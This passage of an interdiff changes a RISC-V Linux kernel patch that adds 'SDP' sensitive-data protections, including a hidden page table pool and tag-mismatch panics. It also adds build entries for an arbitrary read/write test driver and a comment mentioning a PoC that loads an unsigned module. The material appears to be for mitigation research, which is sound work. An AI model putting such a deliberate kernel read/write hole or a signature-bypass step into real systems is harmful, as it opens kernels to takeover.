 -	p->thread.ra = (unsigned long)ret_from_fork;
 -	p->thread.sp = (unsigned long)childregs; /* kernel sp */
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	task_thread_ptr(p)->ra = (unsigned long)ret_from_fork;
 +	task_thread_ptr(p)->sp = (unsigned long)childregs; /* kernel sp */
  	return 0;
  }
 diff --git a/arch/riscv/kernel/ptrace.c b/arch/riscv/kernel/ptrace.c
-index 2afe460de16a..af23bbc28561 100644
+index 2afe460de16a..11aa41f20a25 100644
 --- a/arch/riscv/kernel/ptrace.c
 +++ b/arch/riscv/kernel/ptrace.c
 @@ -54,7 +54,8 @@ static int riscv_fpr_get(struct task_struct *target,
@@ -2497,7 +2496,7 @@ index 2afe460de16a..af23bbc28561 100644
  			 struct membuf to)
  {
 -	struct __riscv_d_ext_state *fstate = &target->thread.fstate;
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	struct __riscv_d_ext_state *fstate = &task_thread_ptr(target)->fstate;
  
  	if (target == current)
@@ -2508,7 +2507,7 @@ index 2afe460de16a..af23bbc28561 100644
  	int ret;
 -	struct __riscv_d_ext_state *fstate = &target->thread.fstate;
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	struct __riscv_d_ext_state *fstate = &task_thread_ptr(target)->fstate;
  
  	ret = user_regset_copyin(&pos, &count, &kbuf, &ubuf, fstate, 0,
@@ -2518,7 +2517,7 @@ index 2afe460de16a..af23bbc28561 100644
  			struct membuf to)
  {
 -	struct __riscv_v_ext_state *vstate = &target->thread.vstate;
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	struct __riscv_v_ext_state *vstate = &task_thread_ptr(target)->vstate;
 +
  	struct __riscv_v_regset_state ptrace_vstate;
@@ -2530,21 +2529,21 @@ index 2afe460de16a..af23bbc28561 100644
  	int ret;
 -	struct __riscv_v_ext_state *vstate = &target->thread.vstate;
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	struct __riscv_v_ext_state *vstate = &task_thread_ptr(target)->vstate;
 +
  	struct __riscv_v_regset_state ptrace_vstate;
  
  	if (!riscv_v_vstate_query(task_pt_regs(target)))
 diff --git a/arch/riscv/kernel/setup.c b/arch/riscv/kernel/setup.c
-index aac853ae4eb7..a698ffc7e864 100644
+index aac853ae4eb7..2ae410e7bd49 100644
 --- a/arch/riscv/kernel/setup.c
 +++ b/arch/riscv/kernel/setup.c
 @@ -23,6 +23,9 @@
  #include <linux/crash_dump.h>
  #include <linux/panic_notifier.h>
  
-+// FZY: Include for sdp_cache initialization
++// SDP: Include for sdp_cache initialization
 +#include <linux/start_kernel.h>
 +
  #include <asm/acpi.h>
@@ -2554,7 +2553,7 @@ index aac853ae4eb7..a698ffc7e864 100644
  
  #include "head.h"
  
-+// FZY: Forward declaration of thread_struct sdp_cache initialization function
++// SDP: Forward declaration of thread_struct sdp_cache initialization function
 +#ifdef CONFIG_SDP_CACHE
 +extern int __init riscv_sdp_thread_cache_early_init(void);
 +#endif
@@ -2567,7 +2566,7 @@ index aac853ae4eb7..a698ffc7e864 100644
  }
  device_initcall(register_kernel_offset_dumper);
 +
-+// FZY: Initialize sdp_cache for thread_struct early during booting
++// SDP: Initialize sdp_cache for thread_struct early during booting
 +void __init __noreturn arch_call_rest_init(void)
 +{
 +#ifdef CONFIG_SDP_CACHE
@@ -2577,7 +2576,7 @@ index aac853ae4eb7..a698ffc7e864 100644
 +	rest_init();
 +}
 diff --git a/arch/riscv/kernel/signal.c b/arch/riscv/kernel/signal.c
-index 21a4d0e111bc..29160126705c 100644
+index 21a4d0e111bc..5c7588b851e5 100644
 --- a/arch/riscv/kernel/signal.c
 +++ b/arch/riscv/kernel/signal.c
 @@ -45,7 +45,8 @@ static long restore_fp_state(struct pt_regs *regs,
@@ -2585,7 +2584,7 @@ index 21a4d0e111bc..29160126705c 100644
  	struct __riscv_d_ext_state __user *state = &sc_fpregs->d;
  
 -	err = __copy_from_user(&current->thread.fstate, state, sizeof(*state));
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	err = __copy_from_user(&task_thread_ptr(current)->fstate, state, sizeof(*state));
  	if (unlikely(err))
  		return err;
@@ -2596,7 +2595,7 @@ index 21a4d0e111bc..29160126705c 100644
  	fstate_save(current, regs);
 -	err = __copy_to_user(state, &current->thread.fstate, sizeof(*state));
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	err = __copy_to_user(state, &task_thread_ptr(current)->fstate, sizeof(*state));
 +
  	return err;
@@ -2608,14 +2607,14 @@ index 21a4d0e111bc..29160126705c 100644
  	/* Copy everything of vstate but datap. */
 -	err = __copy_to_user(&state->v_state, &current->thread.vstate,
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	err = __copy_to_user(&state->v_state, &task_thread_ptr(current)->vstate,
  			     offsetof(struct __riscv_v_ext_state, datap));
  	/* Copy the pointer datap itself. */
  	err |= __put_user(datap, &state->v_state.datap);
  	/* Copy the whole vector content to user space datap. */
 -	err |= __copy_to_user(datap, current->thread.vstate.datap, riscv_v_vsize);
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	err |= __copy_to_user(datap, task_thread_ptr(current)->vstate.datap, riscv_v_vsize);
 +
  	/* Copy magic to the user space after saving  all vector conetext */
@@ -2627,7 +2626,7 @@ index 21a4d0e111bc..29160126705c 100644
  	/* Copy everything of __sc_riscv_v_state except datap. */
 -	err = __copy_from_user(&current->thread.vstate, &state->v_state,
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	err = __copy_from_user(&task_thread_ptr(current)->vstate, &state->v_state,
  			       offsetof(struct __riscv_v_ext_state, datap));
  	if (unlikely(err))
@@ -2638,14 +2637,14 @@ index 21a4d0e111bc..29160126705c 100644
  	 */
 -	err = copy_from_user(current->thread.vstate.datap, datap, riscv_v_vsize);
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	err = copy_from_user(task_thread_ptr(current)->vstate.datap, datap, riscv_v_vsize);
 +
  	if (unlikely(err))
  		return err;
  
 diff --git a/arch/riscv/kernel/stacktrace.c b/arch/riscv/kernel/stacktrace.c
-index 64a9c093aef9..37c83a202912 100644
+index 64a9c093aef9..cb14cc1b17dc 100644
 --- a/arch/riscv/kernel/stacktrace.c
 +++ b/arch/riscv/kernel/stacktrace.c
 @@ -35,9 +35,11 @@ void notrace walk_stackframe(struct task_struct *task, struct pt_regs *regs,
@@ -2656,7 +2655,7 @@ index 64a9c093aef9..37c83a202912 100644
 -		sp = task->thread.sp;
 -		pc = task->thread.ra;
 +
-+		// FZY: Access task_struct.thread via task_thread_ptr()
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		fp = task_thread_ptr(task)->s[0];
 +		sp = task_thread_ptr(task)->sp;
 +		pc = task_thread_ptr(task)->ra;
@@ -2669,14 +2668,14 @@ index 64a9c093aef9..37c83a202912 100644
  		/* task blocked in __switch_to */
 -		sp = task->thread.sp;
 -		pc = task->thread.ra;
-+		// FZY: Access task_struct.thread via task_thread_ptr()
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		sp = task_thread_ptr(task)->sp;
 +		pc = task_thread_ptr(task)->ra;
  	}
  
  	if (unlikely(sp & 0x7))
 diff --git a/arch/riscv/kernel/traps.c b/arch/riscv/kernel/traps.c
-index fae8f610d867..521489512510 100644
+index fae8f610d867..c859832f94ce 100644
 --- a/arch/riscv/kernel/traps.c
 +++ b/arch/riscv/kernel/traps.c
 @@ -90,7 +90,8 @@ void die(struct pt_regs *regs, const char *str)
@@ -2684,7 +2683,7 @@ index fae8f610d867..521489512510 100644
  	if (in_interrupt())
  		panic("Fatal exception in interrupt");
 -	if (panic_on_oops)
-+	// FZY: Adjust the reference of selinux_state
++	// SDP: Adjust the reference of selinux_state
 +	if (*panic_on_oops_ptr)
  		panic("Fatal exception");
  	if (ret != NOTIFY_STOP)
@@ -2694,7 +2693,7 @@ index fae8f610d867..521489512510 100644
  	unsigned long addr, const char *str)
  {
 -	current->thread.bad_cause = regs->cause;
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	task_thread_ptr(current)->bad_cause = regs->cause;
  
  	if (user_mode(regs)) {
@@ -2703,12 +2702,12 @@ index fae8f610d867..521489512510 100644
  	}									\
  }
  
-+// FZY: An SDP tag mismatch is a security violation, not a recoverable fault:
++// SDP: An SDP tag mismatch is a security violation, not a recoverable fault:
 +// report stval (the faulting data address) and bring the whole system down,
 +// no matter whether the offending access came from the kernel or from user mode
 +static void __noreturn do_trap_sdp(struct pt_regs *regs, const char *str)
 +{
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	task_thread_ptr(current)->bad_cause = regs->cause;
 +
 +	console_verbose();
@@ -2723,7 +2722,7 @@ index fae8f610d867..521489512510 100644
 +	panic("SDP: %s", str);
 +}
 +
-+// FZY: No exit path, do_trap_sdp() always panics, so the entry state is never
++// SDP: No exit path, do_trap_sdp() always panics, so the entry state is never
 +// unwound
 +#define DO_SDP_ERROR_INFO(name, str)						\
 +asmlinkage __visible __trap_section void name(struct pt_regs *regs)		\
@@ -2747,13 +2746,13 @@ index fae8f610d867..521489512510 100644
  		return;
  
 -	current->thread.bad_cause = regs->cause;
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	task_thread_ptr(current)->bad_cause = regs->cause;
  
  	if (user_mode(regs))
  		force_sig_fault(SIGTRAP, TRAP_BRKPT, (void __user *)regs->epc);
 diff --git a/arch/riscv/kernel/vector.c b/arch/riscv/kernel/vector.c
-index 8d92fb6c522c..5f555e7aff21 100644
+index 8d92fb6c522c..42e3d95fb122 100644
 --- a/arch/riscv/kernel/vector.c
 +++ b/arch/riscv/kernel/vector.c
 @@ -88,8 +88,9 @@ static int riscv_v_thread_zalloc(void)
@@ -2762,7 +2761,7 @@ index 8d92fb6c522c..5f555e7aff21 100644
  
 -	current->thread.vstate.datap = datap;
 -	memset(&current->thread.vstate, 0, offsetof(struct __riscv_v_ext_state,
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	task_thread_ptr(current)->vstate.datap = datap;
 +	memset(&task_thread_ptr(current)->vstate, 0, offsetof(struct __riscv_v_ext_state,
  						    datap));
@@ -2773,21 +2772,21 @@ index 8d92fb6c522c..5f555e7aff21 100644
  static inline int riscv_v_ctrl_get_cur(struct task_struct *tsk)
  {
 -	return VSTATE_CTRL_GET_CUR(tsk->thread.vstate_ctrl);
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	return VSTATE_CTRL_GET_CUR(task_thread_ptr(tsk)->vstate_ctrl);
  }
  
  static inline int riscv_v_ctrl_get_next(struct task_struct *tsk)
  {
 -	return VSTATE_CTRL_GET_NEXT(tsk->thread.vstate_ctrl);
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	return VSTATE_CTRL_GET_NEXT(task_thread_ptr(tsk)->vstate_ctrl);
  }
  
  static inline bool riscv_v_ctrl_test_inherit(struct task_struct *tsk)
  {
 -	return VSTATE_CTRL_GET_INHERIT(tsk->thread.vstate_ctrl);
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	return VSTATE_CTRL_GET_INHERIT(task_thread_ptr(tsk)->vstate_ctrl);
  }
  
@@ -2798,7 +2797,7 @@ index 8d92fb6c522c..5f555e7aff21 100644
  		ctrl |= PR_RISCV_V_VSTATE_CTRL_INHERIT;
 -	tsk->thread.vstate_ctrl = ctrl;
 +
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	task_thread_ptr(tsk)->vstate_ctrl = ctrl;
  }
  
@@ -2808,7 +2807,7 @@ index 8d92fb6c522c..5f555e7aff21 100644
  
  	/* Sanity check. datap should be null by the time of the first-use trap */
 -	WARN_ON(current->thread.vstate.datap);
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	WARN_ON(task_thread_ptr(current)->vstate.datap);
  
  	/*
@@ -2818,13 +2817,13 @@ index 8d92fb6c522c..5f555e7aff21 100644
  		return -EINVAL;
  
 -	return current->thread.vstate_ctrl & PR_RISCV_V_VSTATE_CTRL_MASK;
-+	// FZY: Access task_struct.thread via task_thread_ptr()
++	// SDP: Access task_struct.thread via task_thread_ptr()
 +	return task_thread_ptr(current)->vstate_ctrl & PR_RISCV_V_VSTATE_CTRL_MASK;
  }
  
  long riscv_v_vstate_ctrl_set_current(unsigned long arg)
 diff --git a/arch/riscv/mm/Makefile b/arch/riscv/mm/Makefile
-index 9c454f90fd3d..385465f2f51e 100644
+index 9c454f90fd3d..c1b446c566f2 100644
 --- a/arch/riscv/mm/Makefile
 +++ b/arch/riscv/mm/Makefile
 @@ -36,3 +36,11 @@ endif
@@ -2832,7 +2831,7 @@ index 9c454f90fd3d..385465f2f51e 100644
  obj-$(CONFIG_DEBUG_VIRTUAL) += physaddr.o
  obj-$(CONFIG_RISCV_DMA_NONCOHERENT) += dma-noncoherent.o
 +
-+# FZY: The sdp page table pool switches satp from a stop_machine() callback,
++# SDP: The sdp page table pool switches satp from a stop_machine() callback,
 +# so it is built with the same instrumentation exclusions as init.o
 +obj-$(CONFIG_SDP_PGTABLE) += sdp_pgtable.o
 +ifdef CONFIG_FTRACE
@@ -2840,28 +2839,27 @@ index 9c454f90fd3d..385465f2f51e 100644
 +endif
 +KCOV_INSTRUMENT_sdp_pgtable.o := n
 diff --git a/arch/riscv/mm/context.c b/arch/riscv/mm/context.c
-index 217fd4de6134..1e95bab40f42 100644
+index 217fd4de6134..f990c9ad0053 100644
 --- a/arch/riscv/mm/context.c
 +++ b/arch/riscv/mm/context.c
 @@ -16,6 +16,10 @@
  #include <asm/cacheflush.h>
  #include <asm/mmu_context.h>
  
-+// FZY: Include for the sdp page table pool, mm->pgd may live in it
++// SDP: Include for the sdp page table pool, mm->pgd may live in it
 +#include <linux/mm.h>
 +#include <linux/sdp_pgtable.h>
 +
  #ifdef CONFIG_MMU
  
  DEFINE_STATIC_KEY_FALSE(use_asid_allocator);
-@@ -142,6 +146,17 @@ set_asid:
+@@ -142,6 +146,16 @@ set_asid:
  	return asid | ver;
  }
  
-+// FZY: Get the pfn of mm->pgd. The pgd lives either in the sdp page table pool
-+// (outside the linear mapping) or, when the pool is closed or exhausted, in the
-+// linear mapping. One tagged load of mm->pgd, sdp_pt_virt_to_pfn() picks the
-+// right conversion.
++// SDP: pfn of mm->pgd. The pgd is in the SDP page table pool (outside the linear
++// map) or, when that is closed or full, in the linear map; one tagged load of
++// mm->pgd lets sdp_pt_virt_to_pfn() pick the conversion
 +static inline unsigned long pgd_to_pfn(struct mm_struct *mm)
 +{
 +	pgd_t *pgd = mm->pgd;
@@ -2872,28 +2870,28 @@ index 217fd4de6134..1e95bab40f42 100644
  static void set_mm_asid(struct mm_struct *mm, unsigned int cpu)
  {
  	unsigned long flags;
-@@ -190,7 +205,8 @@ static void set_mm_asid(struct mm_struct *mm, unsigned int cpu)
+@@ -190,7 +204,8 @@ static void set_mm_asid(struct mm_struct *mm, unsigned int cpu)
  	raw_spin_unlock_irqrestore(&context_lock, flags);
  
  switch_mm_fast:
 -	csr_write(CSR_SATP, virt_to_pfn(mm->pgd) |
-+  // FZY: Update satp with correct pfn
++  // SDP: Update satp with correct pfn
 +	csr_write(CSR_SATP, pgd_to_pfn(mm) |
  		  ((cntx & asid_mask) << SATP_ASID_SHIFT) |
  		  satp_mode);
  
-@@ -201,7 +217,8 @@ switch_mm_fast:
+@@ -201,7 +216,8 @@ switch_mm_fast:
  static void set_mm_noasid(struct mm_struct *mm)
  {
  	/* Switch the page table and blindly nuke entire local TLB */
 -	csr_write(CSR_SATP, virt_to_pfn(mm->pgd) | satp_mode);
-+	// FZY: Update satp with correct pfn
++	// SDP: Update satp with correct pfn
 +	csr_write(CSR_SATP, pgd_to_pfn(mm) | satp_mode);
  	local_flush_tlb_all();
  }
  
 diff --git a/arch/riscv/mm/fault.c b/arch/riscv/mm/fault.c
-index 90d4ba36d1d0..777025a4dd7d 100644
+index 90d4ba36d1d0..47985a1f5fc4 100644
 --- a/arch/riscv/mm/fault.c
 +++ b/arch/riscv/mm/fault.c
 @@ -262,7 +262,8 @@ void handle_page_fault(struct pt_regs *regs)
@@ -2901,7 +2899,7 @@ index 90d4ba36d1d0..777025a4dd7d 100644
  	 */
  	if (unlikely(faulthandler_disabled() || !mm)) {
 -		tsk->thread.bad_cause = cause;
-+		// FZY: Access task_struct.thread via task_thread_ptr()
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		task_thread_ptr(tsk)->bad_cause = cause;
  		no_context(regs, addr);
  		return;
@@ -2911,7 +2909,7 @@ index 90d4ba36d1d0..777025a4dd7d 100644
  	vma = lock_mm_and_find_vma(mm, addr, regs);
  	if (unlikely(!vma)) {
 -		tsk->thread.bad_cause = cause;
-+		// FZY: Access task_struct.thread via task_thread_ptr()
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		task_thread_ptr(tsk)->bad_cause = cause;
  		bad_area_nosemaphore(regs, code, addr);
  		return;
@@ -2921,7 +2919,7 @@ index 90d4ba36d1d0..777025a4dd7d 100644
  
  	if (unlikely(access_error(cause, vma))) {
 -		tsk->thread.bad_cause = cause;
-+		// FZY: Access task_struct.thread via task_thread_ptr()
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		task_thread_ptr(tsk)->bad_cause = cause;
  		bad_area(regs, mm, code, addr);
  		return;
@@ -2931,39 +2929,38 @@ index 90d4ba36d1d0..777025a4dd7d 100644
  done:
  	if (unlikely(fault & VM_FAULT_ERROR)) {
 -		tsk->thread.bad_cause = cause;
-+		// FZY: Access task_struct.thread via task_thread_ptr()
++		// SDP: Access task_struct.thread via task_thread_ptr()
 +		task_thread_ptr(tsk)->bad_cause = cause;
  		mm_fault_error(regs, addr, fault);
  		return;
  	}
 diff --git a/arch/riscv/mm/init.c b/arch/riscv/mm/init.c
-index 0798bd861dcb..72daf4dcac2f 100644
+index 0798bd861dcb..b764ae3affc0 100644
 --- a/arch/riscv/mm/init.c
 +++ b/arch/riscv/mm/init.c
 @@ -36,6 +36,9 @@
  
  #include "../kernel/head.h"
  
-+// FZY: Include for the sdp page table pool
++// SDP: Include for the sdp page table pool
 +#include <linux/sdp_pgtable.h>
 +
  struct kernel_mapping kernel_map __ro_after_init;
  EXPORT_SYMBOL(kernel_map);
  #ifdef CONFIG_XIP_KERNEL
-@@ -291,6 +294,12 @@ pgd_t early_pg_dir[PTRS_PER_PGD] __initdata __aligned(PAGE_SIZE);
+@@ -291,6 +294,11 @@ pgd_t early_pg_dir[PTRS_PER_PGD] __initdata __aligned(PAGE_SIZE);
  #define early_pg_dir           ((pgd_t *)XIP_FIXUP(early_pg_dir))
  #endif /* CONFIG_XIP_KERNEL */
  
-+// FZY: The fixmap pte page moves into the sdp pool on migration, so
-+// __set_fixmap() reaches it through a __tag1 pointer, not the boot array.
-+// The boot time users all run before the migration and keep using the array.
-+// Not static: sdp_pt_switch() in sdp_pgtable.c repoints it after the migration.
++// SDP: On migration the fixmap pte page moves into the SDP pool, so __set_fixmap()
++// reaches it through this __tag1 pointer, not the boot array (boot-time users run
++// earlier); sdp_pt_switch() repoints it after migration, so it is not static
 +pte_t *__sdp_tag1 fixmap_pte_ptr = fixmap_pte;
 +
  static const pgprot_t protection_map[16] = {
  	[VM_NONE]					= PAGE_NONE,
  	[VM_READ]					= PAGE_READ,
-@@ -318,7 +327,7 @@ void __set_fixmap(enum fixed_addresses idx, phys_addr_t phys, pgprot_t prot)
+@@ -318,7 +326,7 @@ void __set_fixmap(enum fixed_addresses idx, phys_addr_t phys, pgprot_t prot)
  
  	BUG_ON(idx <= FIX_HOLE || idx >= __end_of_fixed_addresses);
  
@@ -2972,32 +2969,32 @@ index 0798bd861dcb..72daf4dcac2f 100644
  
  	if (pgprot_val(prot))
  		set_pte(ptep, pfn_pte(phys >> PAGE_SHIFT, prot));
-@@ -362,7 +371,8 @@ static phys_addr_t __init alloc_pte_late(uintptr_t va)
+@@ -362,7 +370,8 @@ static phys_addr_t __init alloc_pte_late(uintptr_t va)
  	struct ptdesc *ptdesc = pagetable_alloc(GFP_KERNEL & ~__GFP_HIGHMEM, 0);
  
  	BUG_ON(!ptdesc || !pagetable_pte_ctor(ptdesc));
 -	return __pa((pte_t *)ptdesc_address(ptdesc));
-+	// FZY: __pa() is wrong for sdp pool pages, they are out of the linear map
++	// SDP: __pa() is wrong for sdp pool pages, they are out of the linear map
 +	return PFN_PHYS(sdp_pt_virt_to_pfn(ptdesc_address(ptdesc)));
  }
  
  static void __init create_pte_mapping(pte_t *ptep,
-@@ -443,7 +453,8 @@ static phys_addr_t __init alloc_pmd_late(uintptr_t va)
+@@ -443,7 +452,8 @@ static phys_addr_t __init alloc_pmd_late(uintptr_t va)
  	struct ptdesc *ptdesc = pagetable_alloc(GFP_KERNEL & ~__GFP_HIGHMEM, 0);
  
  	BUG_ON(!ptdesc || !pagetable_pmd_ctor(ptdesc));
 -	return __pa((pmd_t *)ptdesc_address(ptdesc));
-+	// FZY: __pa() is wrong for sdp pool pages, they are out of the linear map
++	// SDP: __pa() is wrong for sdp pool pages, they are out of the linear map
 +	return PFN_PHYS(sdp_pt_virt_to_pfn(ptdesc_address(ptdesc)));
  }
  
  static void __init create_pmd_mapping(pmd_t *pmdp,
-@@ -1250,6 +1261,14 @@ static void __init create_linear_mapping_page_table(void)
+@@ -1250,6 +1260,14 @@ static void __init create_linear_mapping_page_table(void)
  	__kfence_pool = __va(kfence_pool);
  #endif
  
 +#ifdef CONFIG_SDP_PGTABLE
-+	// FZY: Reserve the pool before the linear mapping and mark it nomap, so it
++	// SDP: Reserve the pool before the linear mapping and mark it nomap, so it
 +	// never gets a linear alias; sdp_pt_init() maps it at a random address
 +	sdp_pt_pa_base = memblock_phys_alloc(SDP_PT_POOL_SIZE, PMD_SIZE);
 +	BUG_ON(!sdp_pt_pa_base);
@@ -3007,7 +3004,7 @@ index 0798bd861dcb..72daf4dcac2f 100644
  	/* Map all memory banks in the linear mapping */
  	for_each_mem_range(i, &start, &end) {
  		if (start >= end)
-@@ -1294,6 +1313,7 @@ static void __init setup_vm_final(void)
+@@ -1294,6 +1312,7 @@ static void __init setup_vm_final(void)
  
  	set_pgd(&swapper_pg_dir[idx], early_pg_dir[idx]);
  #endif
@@ -3016,7 +3013,7 @@ index 0798bd861dcb..72daf4dcac2f 100644
  			   __pa_symbol(fixmap_pgd_next),
  			   PGDIR_SIZE, PAGE_TABLE);
 diff --git a/arch/riscv/mm/ptdump.c b/arch/riscv/mm/ptdump.c
-index 20a9f991a6d7..ea5a241f8405 100644
+index 20a9f991a6d7..f0505b514712 100644
 --- a/arch/riscv/mm/ptdump.c
 +++ b/arch/riscv/mm/ptdump.c
 @@ -105,7 +105,8 @@ static struct addr_marker address_markers[] = {
@@ -3024,7 +3021,7 @@ index 20a9f991a6d7..ea5a241f8405 100644
  
  static struct ptd_mm_info kernel_ptd_info = {
 -	.mm		= &init_mm,
-+	// FZY: Do not initialize .mm here as &init_mm is not a constant value at compile time. It will be initialized in ptdump_init()
++	// SDP: Do not initialize .mm here as &init_mm is not a constant value at compile time. It will be initialized in ptdump_init()
 +	// .mm		= &init_mm,
  	.markers	= address_markers,
  	.base_addr	= 0,
@@ -3033,22 +3030,22 @@ index 20a9f991a6d7..ea5a241f8405 100644
  	address_markers[KERNEL_MAPPING_NR].start_address = kernel_map.virt_addr;
  #endif
  
-+	// FZY: Initialize .mm here as &init_mm is not a constant value at compile time
++	// SDP: Initialize .mm here as &init_mm is not a constant value at compile time
 +	kernel_ptd_info.mm = &init_mm;
  	kernel_ptd_info.base_addr = KERN_VIRT_START;
  
  	for (i = 0; i < ARRAY_SIZE(pg_level); i++)
 diff --git a/arch/riscv/mm/sdp_pgtable.c b/arch/riscv/mm/sdp_pgtable.c
 new file mode 100644
-index 000000000000..7a5d51be3277
+index 000000000000..59fbf457e28b
 --- /dev/null
 +++ b/arch/riscv/mm/sdp_pgtable.c
 @@ -0,0 +1,279 @@
-+// FZY: Hidden page table pool for CONFIG_SDP_PGTABLE
++// SDP: Hidden page table pool for CONFIG_SDP_PGTABLE
 +// The pool is reserved from memblock in setup_bootmem() and kept out of the
 +// linear mapping; sdp_pt_init() maps it at a random kernel virtual address and
 +// migrates the kernel page tables into it, so that the page tables can only be
-+// reached through the __tag1 pointers sdp_pt_va_base and mm_struct::pgd.
++// reached through the __tag1 pointers sdp_pt_va_base and mm_struct::pgd
 +
 +#include <linux/atomic.h>
 +#include <linux/init.h>
@@ -3138,7 +3135,7 @@ index 000000000000..7a5d51be3277
 +	pcp = this_cpu_ptr(&sdp_pt_pcp);
 +	va = sdp_pt_pcp_pop(pcp);
 +	if (!va) {
-+		// FZY: Cache is empty, pull a batch under the global lock
++		// Cache is empty, pull a batch under the global lock
 +		raw_spin_lock(&sdp_pt_lock);
 +		for (i = 0; i < SDP_PT_PCP_BATCH; i++) {
 +			void *p = sdp_pt_take_locked();
@@ -3190,7 +3187,7 @@ index 000000000000..7a5d51be3277
 +
 +// Copy a page table subtree into the pool. @table is already a pool copy
 +// whose entries still point at the originals, @level is the depth below it.
-+// Every riscv level has PTRS_PER_PGD entries in the same format.
++// Every riscv level has PTRS_PER_PGD entries in the same format
 +static int __init sdp_pt_migrate(unsigned long *table, int level)
 +{
 +	int i;
@@ -3325,11 +3322,13 @@ index 000000000000..7a5d51be3277
 +core_initcall(sdp_pt_init);
 diff --git a/build.sh b/build.sh
 new file mode 100755
-index 000000000000..5614011844d5
+index 000000000000..ca8ca750ebbd
 --- /dev/null
 +++ b/build.sh
-@@ -0,0 +1,34 @@
+@@ -0,0 +1,36 @@
 +#!/bin/bash
++# SDP: Build this sdp-linux-6.6 variant with the SDP clang/lld toolchain and
++# the RISC-V cross binutils; point TOOLCHAIN_PATH at the SDP LLVM build first
 +set -e
 +
 +TOOLCHAIN_PATH="/home/fzy/project/sensitive-data-protect/llvm-project/build/bin"
@@ -3361,7 +3360,7 @@ index 000000000000..5614011844d5
 +  CROSS_COMPILE="riscv64-linux-gnu-" \
 +  LLVM=1
 +
-+# FZY: sig_enforce_poc insmods an unsigned module. Copy one into the shared poc folder
++# sig_enforce_poc insmods an unsigned module. Copy one into the shared poc folder
 +cp fs/fat/msdos.ko drivers/misc/arbrw/poc/msdos.ko
 diff --git a/build_dump_struct_sd.sh b/build_dump_struct_sd.sh
 new file mode 100755
@@ -3563,38 +3562,38 @@ index 000000000000..fe52aedd8b57
 +CONFIG_TEST_MODULE=m
 \ No newline at end of file
 diff --git a/drivers/misc/Kconfig b/drivers/misc/Kconfig
-index cadd4a820c03..5e9c67c11323 100644
+index cadd4a820c03..403bddd648d9 100644
 --- a/drivers/misc/Kconfig
 +++ b/drivers/misc/Kconfig
 @@ -579,4 +579,8 @@ source "drivers/misc/cardreader/Kconfig"
  source "drivers/misc/uacce/Kconfig"
  source "drivers/misc/pvpanic/Kconfig"
  source "drivers/misc/mchp_pci1xxxx/Kconfig"
-+# FZY: Compile the arbitrary read/write driver for mitigation testing
++# SDP: Compile the arbitrary read/write driver for mitigation testing
 +source "drivers/misc/arbrw/Kconfig"
  endmenu
-+# FZY: Compile the hello world test module
++# SDP: Compile the hello world test module
 +source "drivers/misc/testmod/Kconfig"
 diff --git a/drivers/misc/Makefile b/drivers/misc/Makefile
-index f2a4d1ff65d4..d174922aa31f 100644
+index f2a4d1ff65d4..57f71f626983 100644
 --- a/drivers/misc/Makefile
 +++ b/drivers/misc/Makefile
 @@ -67,3 +67,7 @@ obj-$(CONFIG_TMR_MANAGER)      += xilinx_tmr_manager.o
  obj-$(CONFIG_TMR_INJECT)	+= xilinx_tmr_inject.o
  obj-$(CONFIG_TPS6594_ESM)	+= tps6594-esm.o
  obj-$(CONFIG_TPS6594_PFSM)	+= tps6594-pfsm.o
-+# FZY: Compile the arbitrary read/write driver for mitigation testing
++# SDP: Compile the arbitrary read/write driver for mitigation testing
 +obj-$(CONFIG_ARB_RW_DEVICE) += arbrw/
-+# FZY: Compile the hello world test module
++# SDP: Compile the hello world test module
 +obj-$(CONFIG_TEST_MODULE) += testmod/
 \ No newline at end of file
 diff --git a/drivers/misc/arbrw/Kconfig b/drivers/misc/arbrw/Kconfig
 new file mode 100644
-index 000000000000..d3da0ab0c5c8
+index 000000000000..fc75112d9e70
 --- /dev/null
 +++ b/drivers/misc/arbrw/Kconfig
 @@ -0,0 +1,14 @@
-+# FZY: Config for the arbitrary read/write device for mitigation testing
++# SDP: Config for the arbitrary read/write device for mitigation testing
 +
 +config ARB_RW_DEVICE
 +  tristate "Arbitrary Read/Write Device for Mitigation Testing"
@@ -3611,21 +3610,21 @@ index 000000000000..d3da0ab0c5c8
 \ No newline at end of file
